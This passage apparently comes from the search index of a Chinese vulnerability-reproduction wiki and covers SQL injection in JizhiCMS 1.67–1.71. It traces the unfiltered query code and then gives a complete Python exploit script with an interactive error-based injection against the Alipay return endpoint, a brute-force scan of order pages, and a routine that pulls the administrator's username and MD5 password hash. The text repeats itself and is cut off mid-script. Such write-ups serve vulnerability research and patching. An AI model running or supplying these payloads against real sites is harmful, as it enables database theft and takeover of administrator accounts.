\u5f53\u7ba1\u7406\u5458\u8bbf\u95ee\u65f6XSS\u6210\u529f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS%201.81%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS/#\u53c2\u8003","text":"\u6781\u81f4CMS\u4ee3\u7801\u5ba1\u8ba1","title":"\u53c2\u8003"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS_1.71_1.7_1.67%E7%89%88%E6%9C%ACsql%E6%B3%A8%E5%85%A5/","text":"\u6781\u81f4CMS_1.71_1.7_1.67\u7248\u672csql\u6ce8\u5165(\u652f\u4ed8\u63d2\u4ef6) \u00b6 \u67e5\u770b\u4e00\u4e0b\u8fdb\u884c\u8fc7\u6ee4\u7684\u51fd\u6570 /** \u53c2\u6570\u8fc7\u6ee4\uff0c\u683c\u5f0f\u5316 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://\u6574\u6570 return (int)$value; case 1://\u5b57\u7b26\u4e32 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://\u6570\u7ec4 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://\u6d6e\u70b9 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //\u8fc7\u6ee4XSS\u653b\u51fb function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //\u5220\u9664\u975e\u6253\u5370\u5b57\u7b26\uff0c\u7c97\u66b4\u5f0f\u8fc7\u6ee4xss\u53ef\u7591\u5b57\u7b26\u4e32 $arr[$key] = htmlentities(strip_tags($value)); //\u53bb\u9664 HTML \u548c PHP \u6807\u8bb0\u5e76\u8f6c\u6362\u4e3a HTML \u5b9e\u4f53 } else { SafeFilter($arr[$key]); } } } } \u770b\u4e00\u4e0b\u6267\u884c\u7684SQL\u8bed\u53e5\u7684\u51fd\u6570 // \u67e5\u8be2\u4e00\u6761 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } \u8ddf\u8fdb findAll \u51fd\u6570 // \u67e5\u8be2\u6240\u6709 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } \u5728\u8ddf\u8fdb\u4e00\u4e0bgetData\u51fd\u6570 //\u83b7\u53d6\u6570\u636e public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } \u8ddf\u8fdbquery\u6267\u884c\u51fd\u6570 //\u6267\u884cSQL\u8bed\u53e5\u5e76\u68c0\u67e5\u662f\u5426\u9519\u8bef public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('\u6570\u636e\u5e93\u9519\u8bef\uff1a' . $msg[2] . end($this->filter)); } } \u770b\u5230 $msg = $this->pdo->errorInfo(); \u8bed\u53e5\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f1a\u628a\u6570\u636e\u5e93\u62a5\u9519\u4fe1\u606f\u6253\u5370\u5728\u9875\u9762\u4e0a\u5e76\u663e\u793a\u51fa\u6765\u5e76\u9000\u51fa \u4e00\u5957\u5206\u6790\u4e0b\u6765\u6ca1\u6709\u53d1\u73b0\u5bf9sql\u8bed\u53e5\u7684\u8fc7\u6ee4\uff0c\u5982\u679c\u5f97\u5230\u7684\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7 format_param \u8fc7\u6ee4\uff0c\u4f1a\u4ea7\u751f\u6ce8\u5165 \u4f8b\u5982: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } \u5982\u679c\u76f4\u63a5\u8fd9\u6837GET POST REQUEST \u5e26\u5165\u6570\u636e\u5e93 \u4f1a\u4ea7\u751f\u62a5\u9519\u6ce8\u5165 \u4f8b\u5982 ./exploit/name=123' (\u52a0\u4e00\u4e2a\u5f15\u53f7\u4f1a\u62a5\u9519\uff0c\u5982\u679c\u5f15\u53f7\u6ca1\u8fc7\u6ee4) \u73b0\u5728\u53ea\u9700\u8981\u5bfb\u627e\u7c7b\u578b\u662f\u8fd9\u6837\u6ca1\u8fc7\u6ee4\u76f4\u63a5\u5e26\u5165\u6570\u636e\u5e93\u7684\u8bed\u53e5\u5c31\u884c\u4e86 \u7b80\u5355\u5bfb\u627e\u4e0b\u5176\u5b9e\u8fd9\u6837\u7684\u5730\u65b9\u633a\u591a\u7684\uff0c\u62ff\u4e00\u4e2a\u4f4d\u7f6e\u4e3e\u4f8b\u5b50 \u8fd9\u91cc\u662f\u4e00\u4e2a\u652f\u4ed8\u63d2\u4ef6\u7684\u4f4d\u7f6e\uff0c\u84dd\u8272\u65b9\u57571\u589e\u52a0\u4ee3\u7801\u6a21\u62df\u5f00\u901a\u652f\u4ed8\u5b9d\u529f\u80fd\u901a\u8fc7\u9a8c\u8bc1 \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u51fd\u6570\u53ea\u4f7f\u7528[htmlspecialchars]\u6765\u8fc7\u6ee4\u4e86xss\uff0csql\u8bed\u53e5\u6ca1\u6709\u8fc7\u6ee4\uff0c\u7528\u521a\u521a\u7684\u65b9\u6cd5\u6765\u6ce8\u5165 \u53ef\u4ee5\u770b\u5230\u7684\u786e\u51fa\u73b0\u4e86sql\u8bed\u53e5\u548c\u6570\u636e\u5e93\u9519\u8bef \u76f4\u63a5\u62a5\u9519\u6ce8\u5165\u83b7\u53d6\u654f\u611f\u4fe1\u606f mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" \u5b98\u7f51url : https://www.jizhicms.cn/ \"\"\" def main (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u6781\u81f4CMS 1.67 - 171 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CNVD-2020-49710.py \\033 [0m' ) print ( '+------------------------------------------' ) while True : poc = str ( input ( '\u9009\u62e9\u4f7f\u7528\u7684poc\uff1a \\n ' '1.sql\u6ce8\u5165 \\n ' '2.\u7528\u6237\u8d2d\u7269\u8f66\u7206\u7834 \\n ' '3.GET \u7f51\u7ad9\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801 \\n ' '4.\u9000\u51fa quit \\n ' 'poc:' )) print ( '------------------ peiqi -----------------------' ) if poc == '1' : poc_1 () elif poc == '2' : poc_2 () elif poc == '3' : poc_3 () elif poc == '4' : break else : print ( '\u53c2\u6570\u9519\u8bef\uff0c\u91cd\u65b0\u8f93\u5165' ) def poc_1 (): ## poc_1 ---> sql\u6ce8\u5165\u6f0f\u6d1e\u70b9( Home/c/MypayController.php [alipay_notify_pay]) ## \u4f7f\u7528\u8303\u56f4 \u6781\u81f4cms 1.71 + 1.7 + 1.67 \u7248\u672c \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //\u652f\u4ed8\u5b9d\u516c\u94a5\uff0c\u8d26\u6237\u4e2d\u5fc3->\u5bc6\u94a5\u7ba1\u7406->\u5f00\u653e\u5e73\u53f0\u5bc6\u94a5\uff0c\u627e\u5230\u6dfb\u52a0\u4e86\u652f\u4ed8\u529f\u80fd\u7684\u5e94\u7528\uff0c\u6839\u636e\u4f60\u7684\u52a0\u5bc6\u7c7b\u578b\uff0c\u67e5\u770b\u652f\u4ed8\u5b9d\u516c\u94a5 $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //\u9a8c\u8bc1\u7b7e\u540d $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; <<--- (\u6dfb\u52a0\u7684php\u4ee3\u7801 \u6a21\u62df\u6253\u5f00\u652f\u4ed8\u5b9d \u5e76\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1) if($result===true){ //\u540c\u6b65\u56de\u8c03\u4e00\u822c\u4e0d\u5904\u7406\u4e1a\u52a1\u903b\u8f91\uff0c\u663e\u793a\u4e00\u4e2a\u4ed8\u6b3e\u6210\u529f\u7684\u9875\u9762\uff0c\u6216\u8005\u8df3\u8f6c\u5230\u7528\u6237\u7684\u8d22\u52a1\u8bb0\u5f55\u9875\u9762\u5373\u53ef\u3002 //echo '<h1>\u4ed8\u6b3e\u6210\u529f</h1>'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); << ---- \uff08\u6f0f\u6d1e\u4f4d\u7f6e\uff0c\u53ea\u8fc7\u6ee4\u4e86xss\uff0c\u6ca1\u6709\u8c03\u7528\u51fd\u6570\u8fc7\u6ee4sql\u8bed\u53e5\uff09 $orderno = $out_trade_no; $paytime = time(); $order = M('orders')->find(['orderno'=>$orderno]); << --- (\u6267\u884csql\u6ce8\u5165\u7684\u8bed\u53e5) \"\"\" try : exploit_url = str ( input ( \"\u653b\u51fb\u7f51\u7ad9url\uff1a \\n \" )) while True : payload = str ( input ( \"\u8bf7\u8f93\u5165\u4f60\u7684payload\uff08sql\uff09\u8bed\u53e5: \\n \" )) # mypay/alipay_return_pay?out_trade_no=1 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(\" + payload + \"),0x7e),1)--+\" # print('\u4f60\u7684payload\u8bed\u53e5\u4e3a: \\n', payload_url) response = requests . get ( payload_url ) # print(response.text) data = re . search ( r '~(.*?)~' , response . text ) . group ( 1 ) if data == []: print ( '[!!] sql\u8bed\u53e5\u9519\u8bef \u6216\u8005 \u7248\u672c\u9ad8\u4e8e [\u6781\u81f4cms 1.71 -> \u53d1\u5e03\u65f6\u95f4 2020-05-25]' ) else : print ( '\u5f97\u5230\u7684\u6570\u636e\u4e3a: \\n ' , data ) print ( '------------------ peiqi -----------------------' ) except : print ( '\u51fa\u73b0\u9519\u8bef' ) print ( '------------------ peiqi -----------------------' ) # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2 (): ## poc_2 ---> \u7528\u6237\u8d2d\u7269\u8f66\u9875\u9762\u83b7\u53d6 (Home/c/UserController.php [orderdetails]) ## \u6f0f\u6d1e\u70b9 ---> \u65e0\u7528\u6237cookie id \u7684\u9a8c\u8bc1 ## \u4f7f\u7528\u8303\u56f4 \u6781\u81f4cms 1.8\u4ee5\u4e0b\u5168\u7248\u672c (\u5f53\u524d\u6700\u65b0 v1.8 \u66f4\u65b0\u65f6\u95f4:6\u670830\u65e5) \"\"\" function orderdetails(){ $orderno = $this->frparam('orderno',1); $order = M('orders')->find(['orderno'=>$orderno]); if($orderno && $order){ /* if($order['isshow']!=1){ //\u8d85\u65f6\u6216\u8005\u5df2\u652f\u4ed8 if($order['isshow']==0){ $msg = '\u8ba2\u5355\u5df2\u5220\u9664'; } if($order['isshow']==3){ $msg = '\u8ba2\u5355\u5df2\u8fc7\u671f\uff0c\u4e0d\u53ef\u652f\u4ed8\uff01'; } if($order['isshow']==2){ $msg = '\u8ba2\u5355\u5df2\u652f\u4ed8\uff0c\u8bf7\u52ff\u91cd\u590d\u64cd\u4f5c\uff01'; } if($this->frparam('ajax')){ JsonReturn(['code'=>1,'msg'=>$msg]); } Error($msg); } */ $carts = explode('||',$order['body']); $new = []; foreach($carts as $k=>$v){ $d = explode('-',$v); if($d[0]!=''){ //\u517c\u5bb9\u591a\u6a21\u5757\u5316 if(isset($this->classtypedata[$d[0]])){ $type = $this->classtypedata[$d[0]]; $res = M($type['molds'])->find(['id'=>$d[1]]); $new[] = ['info'=>$res,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; }else{ $new[] = ['info'=>false,'num'=>$d[2],'tid'=>$d[0],'id'=>$d[1],'price'=>$d[3]]; } } } $this->carts = $new; $this->order = $order; $this->display($this->template.'/user/orderdetails'); } } \"\"\" try : exploit_url = str ( input ( \"\u653b\u51fb\u7f51\u7ad9url\uff1a \\n \" )) year_day = str ( input ( \"\u8f93\u5165\u65e5\u671f(\u4f8b\u5982:20200712):\" )) shop = [] # \u904d\u5386\u6240\u6709\u51fa\u73b0\u7684\u7528\u6237\u8d2d\u7269\u8f66\u9875\u9762 for num in range ( 100000 , 999999 ): #payload_url = \"user/orderdetails/orderno/No\" + year_day + str(num) + \".html\" payload_url = \"user/orderdetails/orderno/No20200712213927.html\" response = requests . get ( exploit_url + payload_url ) # \u6253\u5370\u7ed3\u679c if '\u603b\u91d1\u989d' in response . text : print ( '\u8d2d\u7269\u8f66\u9875\u9762\uff1a' , payload_url ) shop . append ( payload_url ) for page in shop : print ( page ) print ( '------------------ peiqi -----------------------' ) except : print ( '\u51fa\u73b0\u9519\u8bef' ) print ( '------------------ peiqi -----------------------' ) def poc_3 (): ## poc_3 ---> \u5f97\u5230\u8d26\u53f7\u5bc6\u7801 ( Home/c/MypayController.php [alipay_notify_pay]) ## \u4f7f\u7528\u8303\u56f4 ---> \u6781\u81f4cms 1.71 + 1.7 + 1.67 \u7248\u672c try : exploit_url = str ( input ( \"\u653b\u51fb\u7f51\u7ad9url\uff1a \\n \" )) # payload --> updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+ # \u7528\u6237\u540d + \u5bc6\u7801 \u957f\u5ea6 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+\" response = requests . get ( payload_url ) str_long = re . search ( r '~(.*?)~' , response . text ) . group ( 1 ) #print(str_long) # \u5f97\u5230\u8d26\u53f7\u5bc6\u7801\uff0c\u5bc6\u7801md5\u683c\u5f0f payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+\" response = requests . get ( payload_url ) admin_name_1 = re . search ( r \"~#(.*?)'\" , response . text ) . group ( 1 ) #print(admin_name_1) payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,\" + str ( int ( str_long ) - 32 ) + \") from jz_level limit 0,1),0x7e),1)--+\" response = requests . get ( payload_url ) admin_name_2 = re . search ( r '~(.*?)~' , response . text ) . group ( 1 ) #print(admin_name_2) # \u5206\u5272\u8d26\u53f7\u5bc6\u7801 admin_passwd = admin_name_1 + admin_name_2 admin_passwd = admin_passwd . split ( ':' ) admin = admin_passwd [ 0 ] passwd = admin_passwd [ 1 ] #print(admin) #print(passwd) print ( \"\u6210\u529f\u5f97\u5230\u8d26\u53f7\u5bc6\u7801\uff1a \\n \" \"\u7528\u6237\u540d:\" , admin , \" \\n \u5bc6\u7801(md5):\" , passwd ) print ( '------------------ peiqi -----------------------' ) except : print ( '\u51fa\u73b0\u9519\u8bef' ) print ( '------------------ peiqi -----------------------' ) if __name__ == '__main__' : main () \u8d2d\u7269\u8f66\u7206\u7834\u6ca1\u6709\u5229\u7528\u70b9\uff0c\u5173\u4e8e\u5ba1\u8ba1\u90e8\u5206\u53c2\u8003 \u6781\u81f4CMS\u5ba1\u8ba1","title":"\u6781\u81f4CMS_1.71_1.7_1.67\u7248\u672csql\u6ce8\u5165"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E6%9E%81%E8%87%B4CMS/%E6%9E%81%E8%87%B4CMS_1.71_1.7_1.67%E7%89%88%E6%9C%ACsql%E6%B3%A8%E5%85%A5/#\u6781\u81f4cms_171_17_167\u7248\u672csql\u6ce8\u5165\u652f\u4ed8\u63d2\u4ef6","text":"\u67e5\u770b\u4e00\u4e0b\u8fdb\u884c\u8fc7\u6ee4\u7684\u51fd\u6570 /** \u53c2\u6570\u8fc7\u6ee4\uff0c\u683c\u5f0f\u5316 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://\u6574\u6570 return (int)$value; case 1://\u5b57\u7b26\u4e32 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://\u6570\u7ec4 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://\u6d6e\u70b9 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //\u8fc7\u6ee4XSS\u653b\u51fb function SafeFilter(&$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key => $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','>=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //\u5220\u9664\u975e\u6253\u5370\u5b57\u7b26\uff0c\u7c97\u66b4\u5f0f\u8fc7\u6ee4xss\u53ef\u7591\u5b57\u7b26\u4e32 $arr[$key] = htmlentities(strip_tags($value)); //\u53bb\u9664 HTML \u548c PHP \u6807\u8bb0\u5e76\u8f6c\u6362\u4e3a HTML \u5b9e\u4f53 } else { SafeFilter($arr[$key]); } } } } \u770b\u4e00\u4e0b\u6267\u884c\u7684SQL\u8bed\u53e5\u7684\u51fd\u6570 // \u67e5\u8be2\u4e00\u6761 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this->findAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } \u8ddf\u8fdb findAll \u51fd\u6570 // \u67e5\u8be2\u6240\u6709 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key => $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this->table} {$where}\"; return $this->getData($sql); } \u5728\u8ddf\u8fdb\u4e00\u4e0bgetData\u51fd\u6570 //\u83b7\u53d6\u6570\u636e public function getData($sql) { if(!$result = $this->query($sql))return array(); if(!$this->Statement->rowCount())return array(); $rows = array(); while($rows[] = $this->Statement->fetch(PDO::FETCH_ASSOC)){} $this->Statement=null; array_pop($rows); return $rows; } \u8ddf\u8fdbquery\u6267\u884c\u51fd\u6570 //\u6267\u884cSQL\u8bed\u53e5\u5e76\u68c0\u67e5\u662f\u5426\u9519\u8bef public function query($sql){ $this->filter[] = $sql; $this->Statement = $this->pdo->query($sql); if ($this->Statement) { return $this; }else{ $msg = $this->pdo->errorInfo(); if($msg[2]) exit('\u6570\u636e\u5e93\u9519\u8bef\uff1a' . $msg[2] . end($this->filter)); } } \u770b\u5230 $msg = $this->pdo->errorInfo(); \u8bed\u53e5\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f1a\u628a\u6570\u636e\u5e93\u62a5\u9519\u4fe1\u606f\u6253\u5370\u5728\u9875\u9762\u4e0a\u5e76\u663e\u793a\u51fa\u6765\u5e76\u9000\u51fa \u4e00\u5957\u5206\u6790\u4e0b\u6765\u6ca1\u6709\u53d1\u73b0\u5bf9sql\u8bed\u53e5\u7684\u8fc7\u6ee4\uff0c\u5982\u679c\u5f97\u5230\u7684\u6570\u636e\u6ca1\u6709\u7ecf\u8fc7 format_param \u8fc7\u6ee4\uff0c\u4f1a\u4ea7\u751f\u6ce8\u5165 \u4f8b\u5982: function exploit(){ M('member')->find(['username'=>$_GET['name']]); } \u5982\u679c\u76f4\u63a5\u8fd9\u6837GET POST REQUEST \u5e26\u5165\u6570\u636e\u5e93 \u4f1a\u4ea7\u751f\u62a5\u9519\u6ce8\u5165 \u4f8b\u5982 ./exploit/name=123' (\u52a0\u4e00\u4e2a\u5f15\u53f7\u4f1a\u62a5\u9519\uff0c\u5982\u679c\u5f15\u53f7\u6ca1\u8fc7\u6ee4) \u73b0\u5728\u53ea\u9700\u8981\u5bfb\u627e\u7c7b\u578b\u662f\u8fd9\u6837\u6ca1\u8fc7\u6ee4\u76f4\u63a5\u5e26\u5165\u6570\u636e\u5e93\u7684\u8bed\u53e5\u5c31\u884c\u4e86 \u7b80\u5355\u5bfb\u627e\u4e0b\u5176\u5b9e\u8fd9\u6837\u7684\u5730\u65b9\u633a\u591a\u7684\uff0c\u62ff\u4e00\u4e2a\u4f4d\u7f6e\u4e3e\u4f8b\u5b50 \u8fd9\u91cc\u662f\u4e00\u4e2a\u652f\u4ed8\u63d2\u4ef6\u7684\u4f4d\u7f6e\uff0c\u84dd\u8272\u65b9\u57571\u589e\u52a0\u4ee3\u7801\u6a21\u62df\u5f00\u901a\u652f\u4ed8\u5b9d\u529f\u80fd\u901a\u8fc7\u9a8c\u8bc1 \u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u51fd\u6570\u53ea\u4f7f\u7528[htmlspecialchars]\u6765\u8fc7\u6ee4\u4e86xss\uff0csql\u8bed\u53e5\u6ca1\u6709\u8fc7\u6ee4\uff0c\u7528\u521a\u521a\u7684\u65b9\u6cd5\u6765\u6ce8\u5165 \u53ef\u4ee5\u770b\u5230\u7684\u786e\u51fa\u73b0\u4e86sql\u8bed\u53e5\u548c\u6570\u636e\u5e93\u9519\u8bef \u76f4\u63a5\u62a5\u9519\u6ce8\u5165\u83b7\u53d6\u654f\u611f\u4fe1\u606f mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\" import requests import re \"\"\" \u5b98\u7f51url : https://www.jizhicms.cn/ \"\"\" def main (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u6781\u81f4CMS 1.67 - 171 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CNVD-2020-49710.py \\033 [0m' ) print ( '+------------------------------------------' ) while True : poc = str ( input ( '\u9009\u62e9\u4f7f\u7528\u7684poc\uff1a \\n ' '1.sql\u6ce8\u5165 \\n ' '2.\u7528\u6237\u8d2d\u7269\u8f66\u7206\u7834 \\n ' '3.GET \u7f51\u7ad9\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801 \\n ' '4.\u9000\u51fa quit \\n ' 'poc:' )) print ( '------------------ peiqi -----------------------' ) if poc == '1' : poc_1 () elif poc == '2' : poc_2 () elif poc == '3' : poc_3 () elif poc == '4' : break else : print ( '\u53c2\u6570\u9519\u8bef\uff0c\u91cd\u65b0\u8f93\u5165' ) def poc_1 (): ## poc_1 ---> sql\u6ce8\u5165\u6f0f\u6d1e\u70b9( Home/c/MypayController.php [alipay_notify_pay]) ## \u4f7f\u7528\u8303\u56f4 \u6781\u81f4cms 1.71 + 1.7 + 1.67 \u7248\u672c \"\"\" function alipay_return_pay(){ extendFile('pay/alipay/AlipayServiceCheck.php'); //\u652f\u4ed8\u5b9d\u516c\u94a5\uff0c\u8d26\u6237\u4e2d\u5fc3->\u5bc6\u94a5\u7ba1\u7406->\u5f00\u653e\u5e73\u53f0\u5bc6\u94a5\uff0c\u627e\u5230\u6dfb\u52a0\u4e86\u652f\u4ed8\u529f\u80fd\u7684\u5e94\u7528\uff0c\u6839\u636e\u4f60\u7684\u52a0\u5bc6\u7c7b\u578b\uff0c\u67e5\u770b\u652f\u4ed8\u5b9d\u516c\u94a5 $alipayPublicKey=$this->webconf['alipay_public_key']; $aliPay = new \\AlipayServiceCheck($alipayPublicKey); //\u9a8c\u8bc1\u7b7e\u540d $result = $aliPay->rsaCheck($_GET,$_GET['sign_type']); $result=true; <<--- (\u6dfb\u52a0\u7684php\u4ee3\u7801 \u6a21\u62df\u6253\u5f00\u652f\u4ed8\u5b9d \u5e76\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1) if($result===true){ //\u540c\u6b65\u56de\u8c03\u4e00\u822c\u4e0d\u5904\u7406\u4e1a\u52a1\u903b\u8f91\uff0c\u663e\u793a\u4e00\u4e2a\u4ed8\u6b3e\u6210\u529f\u7684\u9875\u9762\uff0c\u6216\u8005\u8df3\u8f6c\u5230\u7528\u6237\u7684\u8d22\u52a1\u8bb0\u5f55\u9875\u9762\u5373\u53ef\u3002 //echo '<h1>\u4ed8\u6b3e\u6210\u529f</h1>'; $out_trade_no = htmlspecialchars($_GET['out_trade_no']); << ---- \uff08\u6f0f\u6d1e\u4f4d\u7f6e\uff0c\u53ea\u8fc7\u6ee4\u4e86xss\uff0c\u6ca1\u6709\u8c03\u7528\u51fd\u6570\u8fc7\u6ee4sql\u8bed\u53e5\uff09 $orderno = $out_trade_no; $paytime = time(); $order = M('orders')->find(['orderno'=>$orderno]); << --- (\u6267\u884csql\u6ce8\u5165\u7684\u8bed\u53e5) \"\"\" try : exploit_url = str ( input ( \"\u653b\u51fb\u7f51\u7ad9url\uff1a \\n \" )) while True : payload = str ( input ( \"\u8bf7\u8f93\u5165\u4f60\u7684payload\uff08sql\uff09\u8bed\u53e5: \\n \" )) # mypay/alipay_return_pay?out_trade_no=1 payload_url = exploit_url + \"mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(\" + payload + \"),0x7e),1)--+\" # print('\u4f60\u7684payload\u8bed\u53e5\u4e3a: \\n', payload_url) response = requests . get ( payload_url ) # print(response.text) data = re . search ( r '~(.*?)~' , response . text ) . group ( 1 ) if data == []: print ( '[!!] sql\u8bed\u53e5\u9519\u8bef \u6216\u8005 \u7248\u672c\u9ad8\u4e8e [\u6781\u81f4cms 1.71 -> \u53d1\u5e03\u65f6\u95f4 2020-05-25]' ) else : print ( '\u5f97\u5230\u7684\u6570\u636e\u4e3a: \\n ' , data ) print ( '------------------ peiqi -----------------------' ) except : print ( '\u51fa\u73b0\u9519\u8bef' ) print ( '------------------ peiqi -----------------------' ) # http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html def poc_2 (): ## poc_2 ---> \u7528\u6237\u8d2d\u7269\u8f66\u9875\u9762\u83b7\u53d6 (Home/c/UserController.php [orderdetails]) ## \u6f0f\u6d1e\u70b9 ---> \u65e0\u7528\u6237cookie id \u7684\u9a8c\u8bc1 ## \u4f7f\u7528\u8303\u56f4 \u6781\u81f4cms 